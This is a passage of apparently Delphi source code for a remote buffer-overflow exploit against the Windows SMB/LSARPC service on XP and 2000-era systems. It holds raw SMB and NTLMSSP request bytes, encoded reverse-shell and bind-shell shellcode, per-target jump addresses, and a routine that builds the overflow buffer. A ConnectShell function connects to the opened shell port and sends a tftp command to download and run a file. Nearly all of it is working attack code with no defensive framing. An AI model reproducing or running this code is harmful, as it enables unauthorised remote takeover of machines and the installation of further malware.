   '\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00'+
   '\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E'+
   '\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46'+
   '\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40'+
   '\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40'+
   '\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48'+
   '\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF'+
   '\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00'+
   '\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00'+
   '\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00'+
   '\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00'+
   '\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00');

   req4: String = (
   '\x00\x00\x00\x5C\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE'+
   '\x00\x08\x30\x00\x04\xFF\x00\x5C\x00\x08\x00\x01\x00\x31\x00\x00'+
   '\x5C\x00\x5C\x00\x31\x00\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00'+
   '\x38\x00\x2E\x00\x31\x00\x2E\x00\x32\x00\x31\x00\x30\x00\x5C\x00'+
   '\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00');

   req5: String = (
   '\x00\x00\x00\x64\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04'+
   '\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x0E\x00\x16\x00\x00\x00'+
   '\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00'+
   '\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00'+
   '\x02\x00\x00\x00\x03\x11\x00\x00\x5C\x00\x6C\x00\x73\x00\x61\x00'+
   '\x72\x00\x70\x00\x63\x00\x00\x00');

   req6: String = (
   '\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04'+
   '\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x04\x00\x00\x00'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02'+
   '\x00\x26\x00\x00\x40\x59\x00\x10\x5C\x00\x50\x00\x49\x00\x50\x00'+
   '\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00'+
   '\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x01\x00\x6A\x28\x19\x39\x0C\xB1\xD0\x11'+
   '\x9B\xA8\x00\xC0\x4F\xD9\x2E\xF5\x00\x00\x00\x00\x04\x5D\x88\x8A'+
   '\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00');

   req7: String = (
   '\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04'+
   '\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02'+
   '\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00'+
   '\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00'+
   '\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00'+
   '\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00');
   // room for shellcode here ...

   Shit1: String = (
   '\x95\x14\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9');

   req8: String = (
   '\x00\x00\x10\xF8\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE'+
   '\x00\x08\x60\x00\x0E\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF'+
   '\xFF\xFF\xFF\x08\x00\xB8\x10\x00\x00\xB8\x10\x40\x00\x00\x00\x00'+
   '\x00\xB9\x10\xEE\x05\x00\x00\x01\x10\x00\x00\x00\xB8\x10\x00\x00'+
   '\x01\x00\x00\x00\x0C\x20\x00\x00\x00\x00\x09\x00\xAD\x0D\x00\x00'+
   '\x00\x00\x00\x00\xAD\x0D\x00\x00');
   // room for shellcode here ...

   Reg9: String = (
   '\x00\x00\x0F\xD8\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x18\x01'+
   '\x00\x08\x70\x00\x10\x00\x00\x84\x0F\x00\x00\x00\x04\x00\x00\x00'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x84\x0F\x54\x00\x02'+
   '\x00\x26\x00\x00\x40\x95\x0F\x00\x5C\x00\x50\x00\x49\x00\x50\x00'+
   '\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x02\x10\x00\x00\x00'+
   '\x84\x0F\x00\x00\x01\x00\x00\x00\x6C\x0F\x00\x00\x00\x00\x09\x00');

   Shit3: String = (
   '\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00'+
   '\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'+
   '\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'+
   '\x00\x00\x00\x00');


   // reverse shellcode
   reverseshell: array[0..315] of byte = (
   $EB,$10,$5B,$4B,$33,$C9,$66,$B9,$25,$01,$80,$34,$0B,$99,$E2,$FA,       // 16
   $EB,$05,$E8,$EB,$FF,$FF,$FF,$70,$62,$99,$99,$99,$C6,$FD,$38,$A9,       // 32
   $99,$99,$99,$12,$D9,$95,$12,$E9,$85,$34,$12,$F1,$91,$12,$6E,$F3,       // 48
   $9D,$C0,$71,$02,$99,$99,$99,$7B,$60,$F1,$AA,$AB,$99,$99,$F1,$EE,       // 64
   $EA,$AB,$C6,$CD,$66,$8F,$12,$71,$F3,$9D,$C0,$71,$1B,$99,$99,$99,       // 80
   $7B,$60,$18,$75,$09,$98,$99,$99,$CD,$F1,$98,$98,$99,$99,$66,$CF,       // 96
   $89,$C9,$C9,$C9,$C9,$D9,$C9,$D9,$C9,$66,$CF,$8D,$12,$41,$F1,$E6,       // 112
   $99,$99,$98,$F1,$9B,$99,$9D,$4B,$12,$55,$F3,$89,$C8,$CA,$66,$CF,       // 128
   $81,$1C,$59,$EC,$D3,$F1,$FA,$F4,$FD,$99,$10,$FF,$A9,$1A,$75,$CD,       // 144
   $14,$A5,$BD,$F3,$8C,$C0,$32,$7B,$64,$5F,$DD,$BD,$89,$DD,$67,$DD,       // 160
   $BD,$A4,$10,$C5,$BD,$D1,$10,$C5,$BD,$D5,$10,$C5,$BD,$C9,$14,$DD,       // 176
   $BD,$89,$CD,$C9,$C8,$C8,$C8,$F3,$98,$C8,$C8,$66,$EF,$A9,$C8,$66,       // 192
   $CF,$9D,$12,$55,$F3,$66,$66,$A8,$66,$CF,$91,$CA,$66,$CF,$85,$66,       // 208
   $CF,$95,$C8,$CF,$12,$DC,$A5,$12,$CD,$B1,$E1,$9A,$4C,$CB,$12,$EB,       // 224
   $B9,$9A,$6C,$AA,$50,$D0,$D8,$34,$9A,$5C,$AA,$42,$96,$27,$89,$A3,       // 240
   $4F,$ED,$91,$58,$52,$94,$9A,$43,$D9,$72,$68,$A2,$86,$EC,$7E,$C3,       // 256
   $12,$C3,$BD,$9A,$44,$FF,$12,$95,$D2,$12,$C3,$85,$9A,$44,$12,$9D,       // 272
   $12,$9A,$5C,$32,$C7,$C0,$5A,$71,$99,$66,$66,$66,$17,$D7,$97,$75,       // 288
   $EB,$67,$2A,$8F,$34,$40,$9C,$57,$76,$57,$79,$F9,$52,$74,$65,$A2,       // 304
   $40,$90,$6C,$34,$75,$60,$33,$F9,$7E,$E0,$5F,$E0);                          // 316

   // bind shellcode
   bindshell: array[0..403] of byte = (
   $EB,$10,$5A,$4A,$33,$C9,$66,$B9,$7D,$01,$80,$34,$0A,$99,$E2,$FA,       // 16
   $EB,$05,$E8,$EB,$FF,$FF,$FF,$70,$95,$98,$99,$99,$C3,$FD,$38,$A9,       // 32
   $99,$99,$99,$12,$D9,$95,$12,$E9,$85,$34,$12,$D9,$91,$12,$41,$12,       // 48
   $EA,$A5,$12,$ED,$87,$E1,$9A,$6A,$12,$E7,$B9,$9A,$62,$12,$D7,$8D,       // 64
   $AA,$74,$CF,$CE,$C8,$12,$A6,$9A,$62,$12,$6B,$F3,$97,$C0,$6A,$3F,       // 80
   $ED,$91,$C0,$C6,$1A,$5E,$9D,$DC,$7B,$70,$C0,$C6,$C7,$12,$54,$12,       // 96
   $DF,$BD,$9A,$5A,$48,$78,$9A,$58,$AA,$50,$FF,$12,$91,$12,$DF,$85,       // 112
   $9A,$5A,$58,$78,$9B,$9A,$58,$12,$99,$9A,$5A,$12,$63,$12,$6E,$1A,       // 128
   $5F,$97,$12,$49,$F3,$9A,$C0,$71,$1E,$99,$99,$99,$1A,$5F,$94,$CB,       // 144
   $CF,$66,$CE,$65,$C3,$12,$41,$F3,$9C,$C0,$71,$ED,$99,$99,$99,$C9,       // 160
   $C9,$C9,$C9,$F3,$98,$F3,$9B,$66,$CE,$75,$12,$41,$5E,$9E,$9B,$99,       // 176
   $9D,$4B,$AA,$59,$10,$DE,$9D,$F3,$89,$CE,$CA,$66,$CE,$69,$F3,$98,       // 192
   $CA,$66,$CE,$6D,$C9,$C9,$CA,$66,$CE,$61,$12,$49,$1A,$75,$DD,$12,       // 208
   $6D,$AA,$59,$F3,$89,$C0,$10,$9D,$17,$7B,$62,$10,$CF,$A1,$10,$CF,       // 224
   $A5,$10,$CF,$D9,$FF,$5E,$DF,$B5,$98,$98,$14,$DE,$89,$C9,$CF,$AA,       // 240
   $50,$C8,$C8,$C8,$F3,$98,$C8,$C8,$5E,$DE,$A5,$FA,$F4,$FD,$99,$14,       // 256
   $DE,$A5,$C9,$C8,$66,$CE,$79,$CB,$66,$CE,$65,$CA,$66,$CE,$65,$C9,       // 272
   $66,$CE,$7D,$AA,$59,$35,$1C,$59,$EC,$60,$C8,$CB,$CF,$CA,$66,$4B,       // 288
   $C3,$C0,$32,$7B,$77,$AA,$59,$5A,$71,$76,$67,$66,$66,$DE,$FC,$ED,       // 304
   $C9,$EB,$F6,$FA,$D8,$FD,$FD,$EB,$FC,$EA,$EA,$99,$DA,$EB,$FC,$F8,       // 320
   $ED,$FC,$C9,$EB,$F6,$FA,$FC,$EA,$EA,$D8,$99,$DC,$E1,$F0,$ED,$CD,       // 336
   $F1,$EB,$FC,$F8,$FD,$99,$D5,$F6,$F8,$FD,$D5,$F0,$FB,$EB,$F8,$EB,       // 352
   $E0,$D8,$99,$EE,$EA,$AB,$C6,$AA,$AB,$99,$CE,$CA,$D8,$CA,$F6,$FA,       // 368
   $F2,$FC,$ED,$D8,$99,$FB,$F0,$F7,$FD,$99,$F5,$F0,$EA,$ED,$FC,$F7,       // 384
   $99,$F8,$FA,$FA,$FC,$E9,$ED,$99,$FA,$F5,$F6,$EA,$FC,$EA,$F6,$FA,       // 400
   $F2,$FC,$ED,$99);                                                                  // 404

   req1: array[0..136] of byte = (
   $00,$00,$00,$85,$FF,$53,$4D,$42,$72,$00,$00,$00,$00,$18,$53,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$FF,$FE,       // 32
   $00,$00,$00,$00,$00,$62,$00,$02,$50,$43,$20,$4E,$45,$54,$57,$4F,       // 48
   $52,$4B,$20,$50,$52,$4F,$47,$52,$41,$4D,$20,$31,$2E,$30,$00,$02,       // 64
   $4C,$41,$4E,$4D,$41,$4E,$31,$2E,$30,$00,$02,$57,$69,$6E,$64,$6F,       // 80
   $77,$73,$20,$66,$6F,$72,$20,$57,$6F,$72,$6B,$67,$72,$6F,$75,$70,       // 96
   $73,$20,$33,$2E,$31,$61,$00,$02,$4C,$4D,$31,$2E,$32,$58,$30,$30,       // 112
   $32,$00,$02,$4C,$41,$4E,$4D,$41,$4E,$32,$2E,$31,$00,$02,$4E,$54,       // 128
   $20,$4C,$4D,$20,$30,$2E,$31,$32,$00);                                         // 137

   req2: array[0..167] of byte = (
   $00,$00,$00,$A4,$FF,$53,$4D,$42,$73,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$FF,$FE,       // 32
   $00,$00,$10,$00,$0C,$FF,$00,$A4,$00,$04,$11,$0A,$00,$00,$00,$00,       // 48
   $00,$00,$00,$20,$00,$00,$00,$00,$00,$D4,$00,$00,$80,$69,$00,$4E,       // 64
   $54,$4C,$4D,$53,$53,$50,$00,$01,$00,$00,$00,$97,$82,$08,$E0,$00,       // 80
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,       // 96
   $57,$00,$69,$00,$6E,$00,$64,$00,$6F,$00,$77,$00,$73,$00,$20,$00,       // 112
   $32,$00,$30,$00,$30,$00,$30,$00,$20,$00,$32,$00,$31,$00,$39,$00,       // 128
   $35,$00,$00,$00,$57,$00,$69,$00,$6E,$00,$64,$00,$6F,$00,$77,$00,       // 144
   $73,$00,$20,$00,$32,$00,$30,$00,$30,$00,$30,$00,$20,$00,$35,$00,       // 160
   $2E,$00,$30,$00,$00,$00,$00,$00);                                              // 168    (176)

   req3: array[0..221] of byte = (
   $00,$00,$00,$DA,$FF,$53,$4D,$42,$73,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$FF,$FE,       // 32
   $00,$08,$20,$00,$0C,$FF,$00,$DA,$00,$04,$11,$0A,$00,$00,$00,$00,       // 48
   $00,$00,$00,$57,$00,$00,$00,$00,$00,$D4,$00,$00,$80,$9F,$00,$4E,       // 64
   $54,$4C,$4D,$53,$53,$50,$00,$03,$00,$00,$00,$01,$00,$01,$00,$46,       // 80
   $00,$00,$00,$00,$00,$00,$00,$47,$00,$00,$00,$00,$00,$00,$00,$40,       // 96
   $00,$00,$00,$00,$00,$00,$00,$40,$00,$00,$00,$06,$00,$06,$00,$40,       // 112
   $00,$00,$00,$10,$00,$10,$00,$47,$00,$00,$00,$15,$8A,$88,$E0,$48,       // 128
   $00,$4F,$00,$44,$00,$00,$81,$19,$6A,$7A,$F2,$E4,$49,$1C,$28,$AF,       // 144
   $30,$25,$74,$10,$67,$53,$57,$00,$69,$00,$6E,$00,$64,$00,$6F,$00,       // 160
   $77,$00,$73,$00,$20,$00,$32,$00,$30,$00,$30,$00,$30,$00,$20,$00,       // 176
   $32,$00,$31,$00,$39,$00,$35,$00,$00,$00,$57,$00,$69,$00,$6E,$00,       // 192
   $64,$00,$6F,$00,$77,$00,$73,$00,$20,$00,$32,$00,$30,$00,$30,$00,       // 208
   $30,$00,$20,$00,$35,$00,$2E,$00,$30,$00,$00,$00,$00,$00);                // 222    (224)

   req4: array[0..95] of byte = (
   $00,$00,$00,$5C,$FF,$53,$4D,$42,$75,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$FF,$FE,       // 32
   $00,$08,$30,$00,$04,$FF,$00,$5C,$00,$08,$00,$01,$00,$31,$00,$00,       // 48
   $5C,$00,$5C,$00,$31,$00,$39,$00,$32,$00,$2E,$00,$31,$00,$36,$00,       // 64
   $38,$00,$2E,$00,$31,$00,$2E,$00,$32,$00,$31,$00,$30,$00,$5C,$00,       // 80
   $49,$00,$50,$00,$43,$00,$24,$00,$00,$00,$3F,$3F,$3F,$3F,$3F,$00);      // 96

   req5: array[0..103] of byte = (
   $00,$00,$00,$64,$FF,$53,$4D,$42,$A2,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$08,$DC,$04,       // 32
   $00,$08,$40,$00,$18,$FF,$00,$DE,$DE,$00,$0E,$00,$16,$00,$00,$00,       // 48
   $00,$00,$00,$00,$9F,$01,$02,$00,$00,$00,$00,$00,$00,$00,$00,$00,       // 64
   $00,$00,$00,$00,$03,$00,$00,$00,$01,$00,$00,$00,$40,$00,$00,$00,       // 80
   $02,$00,$00,$00,$03,$11,$00,$00,$5C,$00,$6C,$00,$73,$00,$61,$00,       // 96
   $72,$00,$70,$00,$63,$00,$00,$00);                                              // 104    (112)

   req6: array[0..159] of byte = (
   $00,$00,$00,$9C,$FF,$53,$4D,$42,$25,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$08,$DC,$04,       // 32
   $00,$08,$50,$00,$10,$00,$00,$48,$00,$00,$00,$00,$04,$00,$00,$00,       // 48
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$54,$00,$48,$00,$54,$00,$02,       // 64
   $00,$26,$00,$00,$40,$59,$00,$10,$5C,$00,$50,$00,$49,$00,$50,$00,       // 80
   $45,$00,$5C,$00,$00,$00,$00,$00,$05,$00,$0B,$03,$10,$00,$00,$00,       // 96
   $48,$00,$00,$00,$01,$00,$00,$00,$B8,$10,$B8,$10,$00,$00,$00,$00,       // 112
   $01,$00,$00,$00,$00,$00,$01,$00,$6A,$28,$19,$39,$0C,$B1,$D0,$11,       // 128
   $9B,$A8,$00,$C0,$4F,$D9,$2E,$F5,$00,$00,$00,$00,$04,$5D,$88,$8A,       // 144
   $EB,$1C,$C9,$11,$9F,$E8,$08,$00,$2B,$10,$48,$60,$02,$00,$00,$00);      // 160

   req7: array[0..123] of byte = (
   $00,$00,$0C,$F4,$FF,$53,$4D,$42,$25,$00,$00,$00,$00,$18,$07,$C8,       // 16
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$08,$DC,$04,       // 32
   $00,$08,$60,$00,$10,$00,$00,$A0,$0C,$00,$00,$00,$04,$00,$00,$00,       // 48
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$54,$00,$A0,$0C,$54,$00,$02,       // 64
   $00,$26,$00,$00,$40,$B1,$0C,$10,$5C,$00,$50,$00,$49,$00,$50,$00,       // 80
   $45,$00,$5C,$00,$00,$00,$00,$00,$05,$00,$00,$03,$10,$00,$00,$00,       // 96
   $A0,$0C,$00,$00,$01,$00,$00,$00,$88,$0C,$00,$00,$00,$00,$09,$00,       // 112
   $EC,$03,$00,$00,$00,$00,$00,$00,$EC,$03,$00,$00);                          // 124    (128)
   // room for shellcode here ...

   Shit1: array[0..143] of byte = (
   $95,$14,$40,$00,$03,$00,$00,$00,$7C,$70,$40,$00,$01,$00,$00,$00,       // 16
   $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,       // 32
   $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,       // 48
   $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,       // 64
   $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$7C,$70,$40,$00,       // 80
   $01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 96
   $7C,$70,$40,$00,$01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,       // 112
   $00,$00,$00,$00,$7C,$70,$40,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 128
   $01,$00,$00,$00,$00,$00,$00,$00,$78,$85,$13,$00,$AB,$5B,$A6,$E9);      // 144

   req8: array[0..103] of byte = (
   $00,$00,$10,$F8,$FF,$53,$4D,$42,$2F,$00,$00,$00,$00,$18,$07,$C8,       // 12
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$08,$FF,$FE,       // 32
   $00,$08,$60,$00,$0E,$FF,$00,$DE,$DE,$00,$40,$00,$00,$00,$00,$FF,       // 48
   $FF,$FF,$FF,$08,$00,$B8,$10,$00,$00,$B8,$10,$40,$00,$00,$00,$00,       // 64
   $00,$B9,$10,$EE,$05,$00,$00,$01,$10,$00,$00,$00,$B8,$10,$00,$00,       // 80
   $01,$00,$00,$00,$0C,$20,$00,$00,$00,$00,$09,$00,$AD,$0D,$00,$00,       // 96
   $00,$00,$00,$00,$AD,$0D,$00,$00);                                              // 104    (112)
   // room for shellcode here ...

   req9: array[0..111] of byte = (
   $00,$00,$0F,$D8,$FF,$53,$4D,$42,$25,$00,$00,$00,$00,$18,$07,$C8,       // 12
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$08,$18,$01,       // 32
   $00,$08,$70,$00,$10,$00,$00,$84,$0F,$00,$00,$00,$04,$00,$00,$00,       // 48
   $00,$00,$00,$00,$00,$00,$00,$00,$00,$54,$00,$84,$0F,$54,$00,$02,       // 64
   $00,$26,$00,$00,$40,$95,$0F,$00,$5C,$00,$50,$00,$49,$00,$50,$00,       // 80
   $45,$00,$5C,$00,$00,$00,$00,$00,$05,$00,$00,$02,$10,$00,$00,$00,       // 96
   $84,$0F,$00,$00,$01,$00,$00,$00,$6C,$0F,$00,$00,$00,$00,$09,$00);      // 112

   Shit3: array[0..131] of byte = (
   $00,$00,$00,$00,$9A,$A8,$40,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 12
   $01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 32
   $01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 48
   $01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 64
   $01,$00,$00,$00,$00,$00,$00,$00,$9A,$A8,$40,$00,$01,$00,$00,$00,       // 80
   $00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$9A,$A8,$40,$00,       // 96
   $01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,       // 112
   $9A,$A8,$40,$00,$01,$00,$00,$00,$00,$00,$00,$00,$01,$00,$00,$00,       // 128
   $00,$00,$00,$00);                                                                  // 132

   *)

   Const
     LEN = 3500;
     BUFSIZE = 2000;
     NOP = $90;
     dPort = 44445;

     WINXPJMP = $01004600;
     WIN2KJMP = $7515123c;
     WIN2SJMP = $751c123c;
     ASMJMP_1: Array[0..3] Of Byte = ($eb, $06, $eb, $06);
     ASMJMP_2: Array[0..3] Of Byte = ($3c, $12, $15, $75);


   Function ConnectShell(IP: String): Bool;
   Var
     ShellSock: TSocket;
     ShellAddr: TSockAddrin;
     L        : Integer;
     RecvBuf  : Array[0..1024] Of Char;
     mkdir_buf: String;
   Begin
     Result := False;
     FillChar(ShellAddr, SizeOf(ShellAddr), 0);

     ShellAddr.sin_family := AF_INET;
     ShellAddr.sin_addr.S_addr := inet_addr(pChar(IP));
     ShellAddr.sin_port := hTons(dPort);;

     ShellSock := Socket(AF_INET, SOCK_STREAM, 0);
     If ShellSock = 0 Then Exit;
     If Connect(ShellSock, ShellAddr, SizeOf(ShellAddr)) = SOCKET_ERROR Then Exit;

     L := Recv(ShellSock, RecvBuf, 1024, 0);
     mkdir_buf := 'tftp -i %s get %s\r\n'; // IP, FILENAME, FILENAME

     If Send(ShellSock, mkdir_buf[1], Length(mkdir_buf), 0) = -1 Then Exit;
     Sleep(500);
     mkdir_buf := '%s\r\n'; // Filename

     If Send(ShellSock, mkdir_buf[1], Length(mkdir_buf), 0) = -1 Then Exit;
     L := Recv(ShellSock, RecvBuf, 1024, 0);

     CloseSocket(ShellSock);
     Result := True;
   End;

   Function DoPointer(I:Integer): Pointer;
   Begin
     Result := Pointer(I);
   End;

   Procedure MemCpy(Var Dest; const Source; Count: Integer);
   Begin
     Move(Source, Dest, Count);
   End;

   Procedure DoMem(D,S: Pointer; Count: Integer);
   Begin
     Move(S, D, Count);
   End;

   Function Exploit2(IP: String; Sock: TSocket; Which: Integer; Target: Integer): Bool;
   Var
     I: Integer;
     Opt: Integer;
     HostIPC: String;
     HostIPC2: Array[0..(39*2)] Of Char;
     Port: ShortInt;
     Sc: Array[0..403] Of Char;
     Buf: Array[0..LEN+1] of Char; //String;
     SendBuf:Array[0..(LEN+1)*2] of Char; //String;
     Req4u: Array[0..SizeOf(Req4)+20] Of Char; //Byte;
     Screq: Array[0..BUFSIZE+SizeOf(Req7)+1500+440] Of Char; //String;
     Screq2k: Array[0..4348+4060] Of Char; //String;
     Screq2k2: Array[0..4348+4060] Of Char; //String;
     RecvBuf: Array[0..1600] Of Char;
     Strasm: String;
     StrBuffer: Array[0..BUFSIZE] Of Char;
     TargetNum: Integer;
     L: Integer;
     SmbLen: Integer;
     UncLen: Integer;

     P: Pointer;
     P2: Pointer;
     JMPADD: ULong;
   Begin

     Result := False;

     ZeroMemory(@HostIPC  , SizeOf(HostIPC  ));
     ZeroMemory(@HostIPC2 , SizeOf(HostIPC2 ));
     ZeroMemory(@Buf      , SizeOf(Buf      ));
     ZeroMemory(@SendBuf  , SizeOf(SendBuf  ));
     ZeroMemory(@Req4u    , SizeOf(Req4u    ));
     ZeroMemory(@Screq    , SizeOf(Screq    ));
     ZeroMemory(@StrBuffer, SizeOf(StrBuffer));
     ZeroMemory(@Screq2k  , SizeOf(Screq2k  ));
     ZeroMemory(@Screq2k2 , SizeOf(Screq2k2 ));
     ZeroMemory(@RecvBuf  , SizeOf(RecvBuf  ));

     HostIPC := '\\'+IP+'\ipc$';
     For I := 0 To 39 Do
     Begin
       HostIPC2[i*2] := HostIPC[i];
       HostIPC2[i*2+1] := #0;
     End;

   //  Move(Req4, Req4u, SizeOf(Req4)-1);
     memcpy(req4u, Req4, SizeOf(Req4)-1);
     memcpy(req4u[48], HostIPC2, Length(HostIPC)*2);
     memcpy(req4u[47+length(hostipc)*2], Req4[87], 9);

     smblen := 54+Length(HostIPC)*2;
     memcpy(req4u[3], smblen, 1);

     unclen :=  9+Length(HostIPC)*2;
     memcpy(req4u[45], unclen, 1);

     Port := hTons(dPort){^9999};
     memcpy(BindShell[176], Port, 2);
     memcpy(Sc, BindShell, SizeOf(BindShell));

     If Which = 1 Then
     Begin
       FillChar(Buf, LEN, NOP);
       Case Target Of
         0: JMPADD := WINXPJMP;
         1: JMPADD := WIN2kJMP;
         2: JMPADD := WIN2SJMP;
       End;
       memcpy(buf[2020], JMPADD, 4);

       memcpy(buf[2036], sc, length(sc));

       memcpy(buf[2840], ASMJMP_1, 4);
       Case Target Of
         0: JMPADD := WINXPJMP;
         1: JMPADD := WIN2kJMP;
         2: JMPADD := WIN2SJMP;
       End;
       memcpy(buf[2844], JMPADD, 4);

       memcpy(buf[2856], sc, length(sc));

       For I := 0 To Len Do
       Begin
         sendbuf[i*2] := Buf[i];
         sendbuf[i*2+1] := #0;
       End;
       SendBuf[LEN*2] := Buf[i];
       SendBuf[LEN*2+1] := #0;

